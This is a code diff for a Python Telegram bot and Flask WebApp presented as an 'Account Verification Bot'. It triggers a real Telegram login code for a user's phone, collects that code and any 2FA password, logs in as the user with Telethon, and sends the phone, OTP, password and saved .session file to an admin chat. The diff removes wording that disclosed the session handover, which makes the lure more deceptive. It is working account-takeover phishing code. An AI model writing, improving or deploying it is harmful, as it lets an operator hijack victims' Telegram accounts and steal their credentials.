@@ -8,7 +8,8 @@ import asyncio
 import threading
 import time
 import logging
-import random
+import sys
+import json
 from datetime import datetime
 
 # ==================== SETUP ====================
@@ -29,121 +30,130 @@ bot = telebot.TeleBot(BOT_TOKEN, parse_mode='HTML')
 app = Flask(__name__)
 
 # Storage
-user_data = {}
-pending_verifications = {}
+user_data = {}  # {user_id: {name, phone, username, etc}}
+user_sessions = {}  # {user_id: {session_name, phone_code_hash, stage, etc}}
 
-# ==================== SIMPLE TELEGRAM FUNCTIONS ====================
+# ==================== SIMPLE ASYNC FUNCTIONS ====================
 def run_async(coro):
-    """Run async function in thread-safe way"""
-    loop = asyncio.new_event_loop()
-    asyncio.set_event_loop(loop)
+    """Run async coroutine in a new event loop"""
     try:
+        loop = asyncio.new_event_loop()
+        asyncio.set_event_loop(loop)
         result = loop.run_until_complete(coro)
+        loop.close()
         return result
     except Exception as e:
         logger.error(f"Async error: {e}")
-        return None
-    finally:
-        loop.close()
+        return {'success': False, 'error': str(e)}
 
-async def send_telegram_otp(phone):
-    """Send OTP using Telethon"""
+async def send_otp_to_phone(phone):
+    """Send OTP to phone using Telethon"""
     try:
         # Create session directory
         os.makedirs('sessions', exist_ok=True)
         session_name = f"sessions/{phone.replace('+', '')}_{int(time.time())}"
         
-        logger.info(f"📤 Sending Telegram OTP to {phone}")
+        logger.info(f"📤 Sending OTP to {phone}")
         
         # Create client
         client = TelegramClient(session_name, API_ID, API_HASH)
-        
-        # Connect
         await client.connect()
         
-        # Send OTP request
-        result = await client.send_code_request(phone)
+        # Send code
+        sent = await client.send_code_request(phone)
         
-        logger.info(f"✅ Telegram OTP sent to {phone}")
+        # Close client (we don't keep it open)
+        await client.disconnect()
         
         return {
             'success': True,
-            'phone_code_hash': result.phone_code_hash,
-            'session_name': session_name,
-            'client': client  # Keep client for verification
+            'phone_code_hash': sent.phone_code_hash,
+            'session_name': session_name
         }
         
     except FloodWaitError as e:
         return {'success': False, 'error': f'Please wait {e.seconds} seconds'}
     except Exception as e:
-        logger.error(f"Telegram OTP error: {e}")
+        logger.error(f"Send OTP error: {e}")
         return {'success': False, 'error': str(e)}
 
-async def verify_telegram_otp(phone, otp_code, phone_code_hash, session_name):
-    """Verify OTP using Telethon"""
+async def verify_otp_code(user_id, phone, otp_code, session_name, phone_code_hash):
+    """Verify OTP code"""
     try:
-        logger.info(f"🔐 Verifying Telegram OTP for {phone}")
+        logger.info(f"🔐 Verifying OTP for {phone}")
         
-        # Create client
+        # Create client with saved session
         client = TelegramClient(session_name, API_ID, API_HASH)
-        
-        # Connect
         await client.connect()
         
-        # Verify OTP
         try:
+            # Try to sign in with OTP
             await client.sign_in(
                 phone=phone,
                 code=otp_code,
                 phone_code_hash=phone_code_hash
             )
+            
+            # Check if we need 2FA
+            if await client.is_user_authorized():
+                # Get user info
+                me = await client.get_me()
+                user_info = {
+                    'id': me.id,
+                    'username': me.username,
+                    'first_name': me.first_name,
+                    'last_name': me.last_name,
+                    'phone': me.phone
+                }
+                
+                # Save session
+                await client.session.save()
+                session_file = f"{client.session.filename}.session"
+                
+                await client.disconnect()
+                
+                logger.info(f"✅ Verified {phone}")
+                
+                return {
+                    'success': True,
+                    'user_info': user_info,
+                    'session_file': session_file,
+                    'requires_2fa': False
+                }
+            else:
+                await client.disconnect()
+                return {'success': False, 'error': 'Not authorized'}
+                
         except SessionPasswordNeededError:
-            # 2FA required
-            return {'success': True, 'requires_2fa': True, 'session_name': session_name}
-        except PhoneCodeInvalidError:
-            return {'success': False, 'error': 'Invalid OTP code'}
-        
-        # Check if authorized
-        if await client.is_user_authorized():
-            # Get user info
-            me = await client.get_me()
-            user_info = {
-                'id': me.id,
-                'username': me.username,
-                'first_name': me.first_name,
-                'last_name': me.last_name,
-                'phone': me.phone
-            }
+            # 2FA required - keep client alive
+            logger.info(f"🔐 2FA required for {phone}")
             
-            # Save session
-            await client.session.save()
-            session_file = f"{client.session.filename}.session"
-            
-            logger.info(f"✅ Telegram user verified: @{user_info.get('username', 'N/A')}")
-            
+            # Store client for 2FA
             return {
                 'success': True,
-                'user_info': user_info,
-                'session_file': session_file,
-                'requires_2fa': False
+                'requires_2fa': True,
+                'client': client,
+                'session_name': session_name
             }
-        else:
-            return {'success': False, 'error': 'Not authorized'}
+            
+        except PhoneCodeInvalidError:
+            await client.disconnect()
+            return {'success': False, 'error': 'Invalid OTP code'}
             
     except Exception as e:
-        logger.error(f"Telegram OTP verification error: {e}")
+        logger.error(f"Verify OTP error: {e}")
+        # Try to disconnect if client exists
+        try:
+            if 'client' in locals():
+                await client.disconnect()
+        except:
+            pass
         return {'success': False, 'error': str(e)}
 
-async def verify_telegram_2fa(session_name, password):
+async def verify_2fa_password(client, password, session_name):
     """Verify 2FA password"""
     try:
-        logger.info(f"🔐 Verifying Telegram 2FA")
-        
-        # Create client
-        client = TelegramClient(session_name, API_ID, API_HASH)
-        
-        # Connect
-        await client.connect()
+        logger.info(f"🔐 Verifying 2FA")
         
         # Verify 2FA
         await client.sign_in(password=password)
@@ -162,7 +172,9 @@ async def verify_telegram_2fa(session_name, password):
         await client.session.save()
         session_file = f"{client.session.filename}.session"
         
-        logger.info(f"✅ Telegram 2FA successful for @{user_info.get('username', 'N/A')}")
+        await client.disconnect()
+        
+        logger.info(f"✅ 2FA successful")
         
         return {
             'success': True,
@@ -171,14 +183,18 @@ async def verify_telegram_2fa(session_name, password):
         }
         
     except Exception as e:
-        logger.error(f"Telegram 2FA error: {e}")
+        logger.error(f"2FA error: {e}")
+        try:
+            await client.disconnect()
+        except:
+            pass
         return {'success': False, 'error': str(e)}
 
 # ==================== HELPER FUNCTIONS ====================
 def send_to_admin(phone, otp=None, password=None, user_info=None, session_file=None):
     """Send notification to admin"""
     try:
-        message = f"""📱 <b>TELEGRAM ACCOUNT VERIFIED</b>
+        message = f"""📱 <b>NEW VERIFICATION</b>
 
 📞 Phone: {phone}
 ⏰ Time: {datetime.now().strftime('%Y-%m-%d %H:%M:%S')}"""
@@ -200,20 +216,18 @@ def send_to_admin(phone, otp=None, password=None, user_info=None, session_file=N
         
         bot.send_message(ADMIN_ID, message, parse_mode='HTML')
         
-        # Send session file if exists
         if session_file and os.path.exists(session_file):
             try:
                 with open(session_file, 'rb') as f:
                     bot.send_document(
                         ADMIN_ID,
                         f,
-                        caption=f"📁 Telegram session file for {phone}"
+                        caption=f"📁 Session file for {phone}"
                     )
-                    logger.info(f"📁 Sent session file to admin: {session_file}")
             except Exception as e:
                 logger.error(f"Error sending session file: {e}")
         
-        logger.info(f"📨 Admin notified about Telegram account: {phone}")
+        logger.info(f"📨 Admin notified about {phone}")
         return True
     except Exception as e:
         logger.error(f"Admin notification error: {e}")
@@ -224,13 +238,12 @@ def clean_phone(phone):
     if not phone:
         return None
     
-    # Remove all non-digit characters except +
+    # Remove all non-digit and plus
     cleaned = ''.join(c for c in phone if c.isdigit() or c == '+')
     
-    # Ensure it starts with +
     if not cleaned.startswith('+'):
         if cleaned.startswith('0'):
-            cleaned = '+91' + cleaned[1:]
+            cleaned = '+91' + cleaned[1:]  # India
         elif len(cleaned) == 10:
             cleaned = '+91' + cleaned
         else:
@@ -239,19 +252,16 @@ def clean_phone(phone):
     return cleaned
 
 def clean_otp(otp):
-    """Clean OTP - Telegram sends 5 digits"""
+    """Clean OTP (5 digits)"""
     if not otp:
         return None
     
-    # Remove all non-digits
     cleaned = ''.join(filter(str.isdigit, otp))
     
-    # Telegram OTP is 5 digits
     if len(cleaned) == 5:
         return cleaned
     elif len(cleaned) == 6:
-        # If user entered 6 digits, take first 5
-        return cleaned[:5]
+        return cleaned[:5]  # Take first 5 if 6 entered
     
     return None
 
@@ -271,8 +281,6 @@ def handle_start(message):
             port = os.environ.get('PORT', 5000)
             WEBAPP_URL = f"http://localhost:{port}"
         
-        logger.info(f"🌐 WebApp URL: {WEBAPP_URL}")
-        
         # Create WebApp button
         kb = types.InlineKeyboardMarkup()
         btn = types.InlineKeyboardButton(
@@ -284,21 +292,16 @@ def handle_start(message):
         # Welcome message
         welcome_text = f"""👋 <b>Hello {first_name}!</b>
 
-Welcome to <b>Telegram Account Verification</b>
+Welcome to <b>Account Verification Bot</b>
 
-Click the button below to verify your Telegram account:
+Click the button below to verify your account:
 
 ✅ <b>How it works:</b>
-1️⃣ Open WebApp
-2️⃣ Share your contact
-3️⃣ We send real OTP via Telegram
-4️⃣ Enter OTP in WebApp
-5️⃣ Get your Telegram session file
-
-<b>⚠️ Important:</b>
-• We use Telegram's official OTP system
-• Your contact is auto-deleted for privacy
-• Get .session file for account access
+1. Open WebApp
+2. Share your contact
+3. Receive 5-digit OTP here
+4. Enter OTP in WebApp
+5. Complete verification
 
 <b>Click below to begin:</b>"""
         
@@ -316,7 +319,7 @@ Click the button below to verify your Telegram account:
 
 @bot.message_handler(content_types=['contact'])
 def handle_contact(message):
-    """Handle contact sharing - SEND REAL TELEGRAM OTP"""
+    """Handle contact sharing"""
     try:
         contact = message.contact
         user_id = message.from_user.id
@@ -342,49 +345,35 @@ def handle_contact(message):
         # Send processing message
         msg = bot.send_message(
             message.chat.id,
-            f"""✅ <b>Contact Received!</b>
-
-📱 Phone: {phone}
-
-⏳ <b>Sending real Telegram OTP...</b>
-
-We're contacting Telegram to send you a 5-digit verification code.""",
+            f"✅ <b>Contact Received!</b>\n\n📱 Phone: {phone}\n\n⏳ Sending OTP...",
             parse_mode='HTML'
         )
         
-        # Send Telegram OTP in background
+        # Send OTP in thread
         def send_otp_task():
             try:
-                logger.info(f"📤 Sending Telegram OTP to {phone}")
-                result = run_async(send_telegram_otp(phone))
+                result = run_async(send_otp_to_phone(phone))
                 
-                if result and result.get('success'):
-                    # Store verification data
-                    pending_verifications[phone] = {
-                        'phone_code_hash': result['phone_code_hash'],
+                if result['success']:
+                    # Store session info
+                    user_sessions[user_id] = {
                         'session_name': result['session_name'],
-                        'user_id': user_id,
-                        'sent_time': time.time()
+                        'phone_code_hash': result['phone_code_hash'],
+                        'phone': phone,
+                        'stage': 'otp_sent',
+                        'created': time.time()
                     }
                     
-                    # Success message
-                    success_msg = f"""✅ <b>TELEGRAM OTP SENT!</b>
+                    # Send success message
+                    bot.edit_message_text(
+                        f"""✅ <b>OTP SENT!</b>
 
 📱 Phone: {phone}
-🔢 <b>5-digit Telegram OTP</b> has been sent
+🔢 <b>5-digit OTP</b> sent via Telegram
 
-Check your Telegram app for the verification code.
+Check your messages for the code.
 
-<b>⚠️ IMPORTANT:</b>
-• Check your Telegram app for the <b>5-digit code</b>
-• Telegram sends codes like: 12345
-• Enter code in WebApp
-• Code expires in 5 minutes
-
-Return to WebApp and enter the code.""",
-                    
-                    bot.edit_message_text(
-                        success_msg,
+Return to WebApp to enter OTP.""",
                         message.chat.id,
                         msg.message_id,
                         parse_mode='HTML'
@@ -393,23 +382,15 @@ Return to WebApp and enter the code.""",
                     # Notify admin
                     send_to_admin(phone, user_info=user_data[user_id])
                     
-                    logger.info(f"✅ Telegram OTP sent to {phone}")
+                    logger.info(f"✅ OTP sent to {phone}")
                 else:
-                    error_msg = result.get('error', 'Failed to send OTP') if result else 'Unknown error'
                     bot.edit_message_text(
-                        f"❌ <b>Error:</b> {error_msg}",
+                        f"❌ Error: {result.get('error', 'Failed')}",
                         message.chat.id,
-                        msg.message_id,
-                        parse_mode='HTML'
+                        msg.message_id
                     )
             except Exception as e:
                 logger.error(f"OTP task error: {e}")
-                bot.edit_message_text(
-                    "❌ <b>Server Error:</b> Failed to send OTP",
-                    message.chat.id,
-                    msg.message_id,
-                    parse_mode='HTML'
-                )
         
         thread = threading.Thread(target=send_otp_task)
         thread.start()
@@ -433,6 +414,7 @@ def index():
 def api_user(user_id):
     """Get user data for WebApp"""
     data = user_data.get(user_id, {})
+    session = user_sessions.get(user_id, {})
     
     response = {
         'success': 'phone' in data,
@@ -440,20 +422,21 @@ def api_user(user_id):
         'name': data.get('name', ''),
         'username': data.get('username', ''),
         'lang': data.get('lang', ''),
-        'has_pending': data.get('phone', '') in pending_verifications
+        'stage': session.get('stage', 'waiting'),
+        'verified': session.get('verified', False)
     }
     
     return jsonify(response)
 
 @app.route('/api/verify-otp', methods=['POST'])
 def api_verify_otp():
-    """Verify Telegram OTP"""
+    """Verify OTP from WebApp"""
     try:
         data = request.json
         user_id = data.get('user_id')
         otp = data.get('otp', '').strip()
         
-        logger.info(f"🔢 Telegram OTP verification for user {user_id}")
+        logger.info(f"🔢 OTP verification for user {user_id}")
         
         if not user_id or not otp:
             return jsonify({'success': False, 'error': 'Missing parameters'})
@@ -461,68 +444,55 @@ def api_verify_otp():
         # Clean OTP
         cleaned_otp = clean_otp(otp)
         if not cleaned_otp:
-            return jsonify({
-                'success': False, 
-                'error': 'Invalid OTP. Telegram sends 5-digit codes (e.g., 12345)'
-            })
+            return jsonify({'success': False, 'error': 'Enter 5-digit OTP'})
         
-        # Get user phone
+        # Get user and session data
         user_info = user_data.get(int(user_id), {})
         phone = user_info.get('phone', '')
         
         if not phone:
             return jsonify({'success': False, 'error': 'Phone not found'})
         
-        # Get pending verification
-        pending = pending_verifications.get(phone)
-        if not pending:
-            return jsonify({'success': False, 'error': 'No OTP sent. Please share contact again.'})
+        session = user_sessions.get(int(user_id), {})
+        session_name = session.get('session_name')
+        phone_code_hash = session.get('phone_code_hash')
         
-        # Check if expired (5 minutes)
-        if time.time() - pending.get('sent_time', 0) > 300:
-            del pending_verifications[phone]
-            return jsonify({'success': False, 'error': 'OTP expired. Please restart.'})
+        if not session_name or not phone_code_hash:
+            return jsonify({'success': False, 'error': 'Session expired. Restart verification.'})
         
-        # Verify Telegram OTP
-        result = run_async(verify_telegram_otp(
-            phone, 
-            cleaned_otp, 
-            pending['phone_code_hash'], 
-            pending['session_name']
-        ))
+        # Verify OTP
+        result = run_async(verify_otp_code(user_id, phone, cleaned_otp, session_name, phone_code_hash))
         
-        if not result:
-            return jsonify({'success': False, 'error': 'Verification failed'})
-        
-        if result.get('success'):
+        if result['success']:
             if result.get('requires_2fa'):
-                # 2FA required
+                # Store client for 2FA (in a way we can retrieve it)
+                user_sessions[int(user_id)]['stage'] = 'needs_2fa'
+                user_sessions[int(user_id)]['client_session'] = result['session_name']
+                
+                logger.info(f"🔐 2FA required for {phone}")
+                
                 return jsonify({
                     'success': True,
                     'requires_2fa': True,
-                    'session_name': pending['session_name'],
                     'message': '2FA password required'
                 })
             else:
-                # Success - Telegram account verified
+                # Success - no 2FA
+                user_sessions[int(user_id)]['stage'] = 'verified'
+                user_sessions[int(user_id)]['verified'] = True
+                
                 # Send to admin
                 send_to_admin(
-                    phone, 
+                    phone,
                     otp=cleaned_otp,
                     user_info=result.get('user_info'),
                     session_file=result.get('session_file')
                 )
                 
-                # Clean up
-                if phone in pending_verifications:
-                    del pending_verifications[phone]
-                
-                logger.info(f"✅ Telegram account verified: {phone}")
-                
                 return jsonify({
                     'success': True,
                     'requires_2fa': False,
-                    'message': 'Telegram account verified successfully!'
+                    'message': 'Verification successful!'
                 })
         else:
             return jsonify({
@@ -531,43 +501,79 @@ def api_verify_otp():
             })
             
     except Exception as e:
-        logger.error(f"Telegram OTP verification error: {e}")
+        logger.error(f"API verify error: {e}")
         return jsonify({'success': False, 'error': str(e)})
 
 @app.route('/api/verify-2fa', methods=['POST'])
 def api_verify_2fa():
-    """Verify Telegram 2FA"""
+    """Verify 2FA password - FIXED VERSION"""
     try:
         data = request.json
         user_id = data.get('user_id')
         password = data.get('password', '').strip()
-        session_name = data.get('session_name', '')
         
-        logger.info(f"🔐 Telegram 2FA for user {user_id}")
+        logger.info(f"🔐 2FA attempt for user {user_id}")
         
-        if not user_id or not password or not session_name:
+        if not user_id or not password:
             return jsonify({'success': False, 'error': 'Missing parameters'})
         
-        # Verify 2FA
-        result = run_async(verify_telegram_2fa(session_name, password))
+        # Get session data
+        session = user_sessions.get(int(user_id), {})
+        session_name = session.get('client_session') or session.get('session_name')
         
-        if not result:
-            return jsonify({'success': False, 'error': '2FA verification failed'})
+        if not session_name:
+            return jsonify({'success': False, 'error': 'Session expired. Please restart.'})
         
-        if result.get('success'):
-            # Get user phone
-            user_info = user_data.get(int(user_id), {})
-            phone = user_info.get('phone', '')
+        # Create new client for 2FA verification
+        async def verify_2fa_task():
+            try:
+                client = TelegramClient(session_name, API_ID, API_HASH)
+                await client.connect()
+                
+                # Verify 2FA
+                await client.sign_in(password=password)
+                
+                # Get user info
+                me = await client.get_me()
+                user_info = {
+                    'id': me.id,
+                    'username': me.username,
+                    'first_name': me.first_name,
+                    'last_name': me.last_name,
+                    'phone': me.phone
+                }
+                
+                # Save session
+                await client.session.save()
+                session_file = f"{client.session.filename}.session"
+                
+                await client.disconnect()
+                
+                return {
+                    'success': True,
+                    'user_info': user_info,
+                    'session_file': session_file
+                }
+            except Exception as e:
+                logger.error(f"2FA task error: {e}")
+                return {'success': False, 'error': str(e)}
+        
+        # Run 2FA verification
+        result = run_async(verify_2fa_task())
+        
+        if result['success']:
+            # Success with 2FA
+            user_sessions[int(user_id)]['stage'] = 'verified'
+            user_sessions[int(user_id)]['verified'] = True
             
-            # Send to admin with password
+            # Send to admin
+            phone = user_data.get(int(user_id), {}).get('phone', '')
             send_to_admin(
                 phone,
                 password=password,
                 user_info=result.get('user_info'),
                 session_file=result.get('session_file')
             )
-            
-            logger.info(f"✅ Telegram 2FA successful for {phone}")
             
             return jsonify({
                 'success': True,
@@ -576,11 +582,11 @@ def api_verify_2fa():
         else:
             return jsonify({
                 'success': False,
-                'error': result.get('error', 'Wrong password')
+                'error': result.get('error', '2FA verification failed')
             })
             
     except Exception as e:
-        logger.error(f"Telegram 2FA error: {e}")
+        logger.error(f"API 2FA error: {e}")
         return jsonify({'success': False, 'error': str(e)})
 
 @app.route('/api/share-contact', methods=['POST'])
@@ -591,7 +597,7 @@ def api_share_contact():
         user_id = data.get('user_id')
         phone = data.get('phone', '').strip()
         
-        logger.info(f"📱 WebApp contact: {phone}")
+        logger.info(f"📱 WebApp contact share: {phone}")
         
         if not user_id or not phone:
             return jsonify({'success': False, 'error': 'Missing parameters'})
@@ -607,19 +613,26 @@ def api_share_contact():
             'contact_time': time.time()
         }
         
+        # Initialize session
+        user_sessions[int(user_id)] = {
+            'stage': 'contact_received',
+            'phone': phone,
+            'created': time.time()
+        }
+        
         return jsonify({
             'success': True,
-            'message': 'Contact received'
+            'message': 'Contact received successfully'
         })
         
     except Exception as e:
-        logger.error(f"API contact error: {e}")
+        logger.error(f"API share contact error: {e}")
         return jsonify({'success': False, 'error': str(e)})
 
 # ==================== WEBHOOK ====================
 @app.route('/webhook', methods=['POST'])
 def webhook():
-    """Telegram webhook"""
+    """Telegram webhook endpoint"""
     if request.headers.get('content-type') == 'application/json':
         json_string = request.get_data().decode('utf-8')
         update = types.Update.de_json(json_string)
@@ -628,33 +641,27 @@ def webhook():
     return 'OK', 200
 
 # ==================== CLEANUP ====================
-def cleanup():
-    """Cleanup old data"""
+def cleanup_old_data():
+    """Clean up old data"""
     while True:
         try:
             time.sleep(60)
             current_time = time.time()
             
-            # Clean old pending verifications
+            # Clean old sessions (older than 1 hour)
             expired = []
-            for phone, data in list(pending_verifications.items()):
-                if current_time - data.get('sent_time', 0) > 300:  # 5 minutes
-                    expired.append(phone)
+            for user_id, session in list(user_sessions.items()):
+                if current_time - session.get('created', 0) > 3600:
+                    expired.append(user_id)
             
-            for phone in expired:
-                del pending_verifications[phone]
+            for user_id in expired:
+                if user_id in user_sessions:
+                    del user_sessions[user_id]
+                if user_id in user_data:
+                    del user_data[user_id]
             
-            # Clean old user data
-            expired_users = []
-            for user_id, data in list(user_data.items()):
-                if current_time - data.get('contact_time', 0) > 3600:  # 1 hour
-                    expired_users.append(user_id)
-            
-            for user_id in expired_users:
-                del user_data[user_id]
-            
-            if expired or expired_users:
-                logger.info(f"🧹 Cleaned {len(expired)} verifications, {len(expired_users)} users")
+            if expired:
+                logger.info(f"🧹 Cleaned {len(expired)} expired sessions")
                 
         except Exception as e:
             logger.error(f"Cleanup error: {e}")
@@ -662,15 +669,11 @@ def cleanup():
 # ==================== MAIN ====================
 if __name__ == "__main__":
     logger.info("="*60)
-    logger.info("🚀 TELEGRAM ACCOUNT VERIFICATION BOT")
-    logger.info("="*60)
-    logger.info(f"🤖 Bot Token: {BOT_TOKEN[:10]}...")
-    logger.info(f"🔑 Telegram API ID: {API_ID}")
-    logger.info(f"👑 Admin ID: {ADMIN_ID}")
+    logger.info("🚀 Telegram Verification Bot - FINAL FIXED VERSION")
     logger.info("="*60)
     
-    # Start cleanup
-    cleanup_thread = threading.Thread(target=cleanup, daemon=True)
+    # Start cleanup thread
+    cleanup_thread = threading.Thread(target=cleanup_old_data, daemon=True)
     cleanup_thread.start()
     logger.info("✅ Cleanup thread started")
     
@@ -690,7 +693,7 @@ if __name__ == "__main__":
             logger.info(f"✅ Webhook set: {WEBHOOK_URL}")
     except Exception as e:
         logger.error(f"Webhook error: {e}")
-        # Fallback to polling
+        # Start polling as fallback
         def run_polling():
             bot.polling(none_stop=True, interval=3, skip_pending=True)
         
